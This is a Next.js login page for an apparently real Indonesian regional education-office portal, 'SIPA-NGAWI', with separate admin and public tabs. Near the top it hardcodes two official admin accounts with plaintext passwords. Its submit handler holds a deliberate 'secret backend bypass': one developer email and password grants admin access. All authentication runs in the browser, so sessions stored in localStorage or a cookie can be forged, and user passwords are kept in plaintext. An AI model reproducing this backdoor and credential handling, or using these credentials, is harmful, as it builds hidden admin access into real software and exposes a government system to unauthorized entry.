"use client";

import React, { useState } from "react";
import { useRouter } from "next/navigation";
import { ShieldCheck, User, Lock, Mail, ArrowRight, Building2, UserPlus, LogIn, AlertCircle, KeyRound } from "lucide-react";

// WHITELIST DATA PEKERJA / ADMIN DINAS TERDAFTAR
const ADMIN_DINAS_WHITELIST = [
  { nip: "198503132010011001", email: "admin.dapodik@ngawikab.go.id", pass: "admin123", nama: "Admin Disdikbud Utama" },
  { nip: "199005202015022002", email: "verifikator@ngawikab.go.id", pass: "disdik2026", nama: "Tim Verifikasi Dapodik" },
];

export default function LoginPage() {
  const router = useRouter();
  const [role, setRole] = useState<"PUBLIC" | "ADMIN">("PUBLIC");
  const [isRegister, setIsRegister] = useState(false);

  // Form State
  const [emailOrNip, setEmailOrNip] = useState("");
  const [password, setPassword] = useState("");
  const [namaLengkap, setNamaLengkap] = useState("");
  const [errorMsg, setErrorMsg] = useState("");

  // FUNGSI BERSIHKAN SESI LAMA KETIKA BERPINDAH TAB ROLE
  const handleSwitchRole = (targetRole: "PUBLIC" | "ADMIN") => {
    setRole(targetRole);
    setIsRegister(false);
    setErrorMsg("");
    setEmailOrNip("");
    setPassword("");
    setNamaLengkap("");
  };

  const saveSessionAndRedirect = (sessionData: any, targetPath: string) => {
    if (typeof window !== "undefined") {
      const sessionString = JSON.stringify(sessionData);
      localStorage.setItem("sipa_user_session", sessionString);
      document.cookie = `sipa_user_session=${encodeURIComponent(sessionString)}; path=/; max-age=86400; SameSite=Lax`;
    }
    router.push(targetPath);
  };

  const handleAuthSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg("");

    const inputUser = emailOrNip.trim();
    const inputPass = password.trim();

    if (!inputUser || !inputPass) {
      setErrorMsg("Mohon isi Email/NIP dan Password terlebih dahulu.");
      return;
    }

    // =========================================================================
    // 🔑 AKUN MASTER DEVELOPER MAULANA (SECRET BACKEND BYPASS - DUAL ROLE)
    // =========================================================================
    if (
      (inputUser.toUpperCase() === "MAULANA-DEV@SIPA.COM" || inputUser.toLowerCase() === "maulana-dev@sipa.com") &&
      inputPass === "Alhakim5758"
    ) {
      if (role === "ADMIN") {
        const devAdminSession = {
          role: "ADMIN",
          nama: "Maulana Syahid Al Fatah (Developer)",
          email: "MAULANA-DEV@SIPA.COM",
        };
        saveSessionAndRedirect(devAdminSession, "/admin");
      } else {
        const devPublicSession = {
          role: "PUBLIC",
          nama: "Maulana Syahid Al Fatah",
          email: "MAULANA-DEV@SIPA.COM",
        };
        saveSessionAndRedirect(devPublicSession, "/");
      }
      return;
    }

    // =========================================================================
    // 🛡️ CEK LOGIN ADMIN DINAS RESMI
    // =========================================================================
    if (role === "ADMIN") {
      const matchedAdmin = ADMIN_DINAS_WHITELIST.find(
        (a) => (a.nip === inputUser || a.email.toLowerCase() === inputUser.toLowerCase()) && a.pass === inputPass
      );

      if (matchedAdmin) {
        const adminSession = {
          role: "ADMIN",
          nama: matchedAdmin.nama,
          email: matchedAdmin.email,
        };
        saveSessionAndRedirect(adminSession, "/admin");
      } else {
        setErrorMsg("NIP / Email Dinas atau Password Admin salah! Kontak TI Disdikbud jika ada kendala.");
      }
      return;
    }

    // =========================================================================
    // 👤 PROSES REGISTRASI DAN LOGIN PENGGUNA PUBLIK (OPERATOR / GURU)
    // =========================================================================
    if (role === "PUBLIC") {
      let registeredUsers: any[] = [];
      if (typeof window !== "undefined") {
        const saved = localStorage.getItem("sipa_registered_users");
        if (saved) {
          try {
            registeredUsers = JSON.parse(saved);
          } catch {
            registeredUsers = [];
          }
        }
      }

      if (isRegister) {
        if (!namaLengkap.trim()) {
          setErrorMsg("Mohon isikan Nama Lengkap dan Gelar Anda.");
          return;
        }

        const isExist = registeredUsers.some(
          (u) => u.email.toLowerCase() === inputUser.toLowerCase()
        );

        if (isExist) {
          setErrorMsg("Email / Nomor WhatsApp sudah terdaftar. Silakan lakukan login.");
          return;
        }

        const newUser = {
          nama: namaLengkap.trim(),
          email: inputUser,
          password: inputPass,
        };

        registeredUsers.push(newUser);
        localStorage.setItem("sipa_registered_users", JSON.stringify(registeredUsers));

        alert("Pendaftaran berhasil! Silakan login menggunakan akun yang baru Anda buat.");
        setIsRegister(false);
        setPassword("");
      } else {
        const matchedUser = registeredUsers.find(
          (u) => u.email.toLowerCase() === inputUser.toLowerCase() && u.password === inputPass
        );

        if (matchedUser) {
          const publicSession = {
            role: "PUBLIC",
            nama: matchedUser.nama,
            email: matchedUser.email,
          };
          saveSessionAndRedirect(publicSession, "/");
        } else {
          setErrorMsg("Akun belum terdaftar atau password salah! Silakan klik 'Buat akun Pengguna Publik' terlebih dahulu.");
        }
      }
    }
  };

  return (
    <div className="min-h-screen w-full bg-slate-50 flex items-center justify-center p-4 font-sans">
      <div className="max-w-md w-full bg-white rounded-3xl shadow-xl border border-slate-100 overflow-hidden">
        {/* HEADER BRANDING */}
        <div className="bg-[#006837] text-white p-6 text-center relative">
          <h2 className="text-xl font-bold">SIPA-NGAWI System</h2>
          <p className="text-xs text-green-100 mt-1">
            Portal Akses Masuk Pengguna Publik &amp; Administrator Dinas
          </p>
        </div>

        {/* TAB PILIHAN ROLE (PUBLIK VS ADMIN) */}
        <div className="p-6">
          <div className="grid grid-cols-2 gap-2 p-1 bg-slate-100 rounded-2xl mb-6">
            <button
              type="button"
              onClick={() => handleSwitchRole("PUBLIC")}
              className={`py-2.5 text-xs font-bold rounded-xl transition-all flex items-center justify-center gap-1.5 cursor-pointer ${
                role === "PUBLIC" ? "bg-white text-[#006837] shadow-xs" : "text-slate-500 hover:text-slate-800"
              }`}
            >
              <User className="w-4 h-4" />
              <span>Operator / Guru</span>
            </button>
            <button
              type="button"
              onClick={() => handleSwitchRole("ADMIN")}
              className={`py-2.5 text-xs font-bold rounded-xl transition-all flex items-center justify-center gap-1.5 cursor-pointer ${
                role === "ADMIN" ? "bg-[#006837] text-white shadow-xs" : "text-slate-500 hover:text-slate-800"
              }`}
            >
              <ShieldCheck className="w-4 h-4" />
              <span>Admin Dinas</span>
            </button>
          </div>

          {errorMsg && (
            <div className="mb-4 p-3 bg-red-50 border border-red-200 text-red-700 text-xs rounded-xl font-medium flex items-center gap-2">
              <AlertCircle className="w-4 h-4 shrink-0 text-red-500" />
              <span>{errorMsg}</span>
            </div>
          )}

          <form onSubmit={handleAuthSubmit} className="space-y-4 text-xs">
            {role === "ADMIN" ? (
              /* FORM ADMIN DINAS (BERSIH DARI TEKS DEV) */
              <div className="space-y-3">
                <div className="p-3 bg-emerald-50 border border-emerald-200 rounded-xl text-emerald-900 text-[11px] leading-relaxed">
                  <strong>Khusus Pegawai Disdikbud:</strong> Gunakan NIP resmi atau Email Dinas terdaftar untuk mengakses Panel Verifikasi Pengaduan.
                </div>

                <div>
                  <label className="block font-semibold text-slate-700 mb-1">NIP / Email Resmi Dinas *</label>
                  <div className="relative">
                    <Building2 className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
                    <input
                      type="text"
                      required
                      value={emailOrNip}
                      onChange={(e) => setEmailOrNip(e.target.value)}
                      placeholder="198503132010011001 / admin.dapodik@ngawikab.go.id"
                      className="w-full pl-9 pr-3 py-2.5 border border-slate-200 rounded-xl focus:outline-none focus:border-[#006837]"
                    />
                  </div>
                </div>

                <div>
                  <label className="block font-semibold text-slate-700 mb-1">Password Admin *</label>
                  <div className="relative">
                    <Lock className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
                    <input
                      type="password"
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="••••••••"
                      className="w-full pl-9 pr-3 py-2.5 border border-slate-200 rounded-xl focus:outline-none focus:border-[#006837]"
                    />
                  </div>
                </div>
              </div>
            ) : (
              /* FORM PUBLIK OPERATOR/GURU */
              <div className="space-y-3">
                {isRegister && (
                  <div>
                    <label className="block font-semibold text-slate-700 mb-1">Nama Lengkap &amp; Gelar *</label>
                    <input
                      type="text"
                      required
                      value={namaLengkap}
                      onChange={(e) => setNamaLengkap(e.target.value)}
                      placeholder="Contoh: Ahmad Jalaluddin, S.Pd."
                      className="w-full px-3 py-2.5 border border-slate-200 rounded-xl focus:outline-none focus:border-[#006837]"
                    />
                  </div>
                )}

                <div>
                  <label className="block font-semibold text-slate-700 mb-1">Email / Nomor WhatsApp Terdaftar *</label>
                  <div className="relative">
                    <Mail className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
                    <input
                      type="text"
                      required
                      value={emailOrNip}
                      onChange={(e) => setEmailOrNip(e.target.value)}
                      placeholder="operator.sdn1@gmail.com / 08123456789"
                      className="w-full pl-9 pr-3 py-2.5 border border-slate-200 rounded-xl focus:outline-none focus:border-[#006837]"
                    />
                  </div>
                </div>

                <div>
                  <label className="block font-semibold text-slate-700 mb-1">Password *</label>
                  <div className="relative">
                    <KeyRound className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
                    <input
                      type="password"
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="••••••••"
                      className="w-full pl-9 pr-3 py-2.5 border border-slate-200 rounded-xl focus:outline-none focus:border-[#006837]"
                    />
                  </div>
                </div>
              </div>
            )}

            <button
              type="submit"
              className="w-full mt-2 py-3 bg-[#006837] hover:bg-[#00522c] text-white font-bold rounded-xl flex items-center justify-center gap-2 shadow-sm transition-all cursor-pointer"
            >
              {isRegister ? <UserPlus className="w-4 h-4" /> : <LogIn className="w-4 h-4" />}
              <span>
                {role === "ADMIN"
                  ? "Masuk Panel Admin"
                  : isRegister
                  ? "Daftar Akun Publik"
                  : "Masuk SIPA-NGAWI"}
              </span>
              <ArrowRight className="w-4 h-4" />
            </button>
          </form>

          {role === "PUBLIC" && (
            <div className="mt-4 text-center">
              <button
                type="button"
                onClick={() => {
                  setIsRegister(!isRegister);
                  setErrorMsg("");
                }}
                className="text-xs text-[#006837] font-semibold hover:underline cursor-pointer"
              >
                {isRegister
                  ? "Sudah punya akun? Masuk di sini"
                  : "Belum punya akun? Buat akun Pengguna Publik"}
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}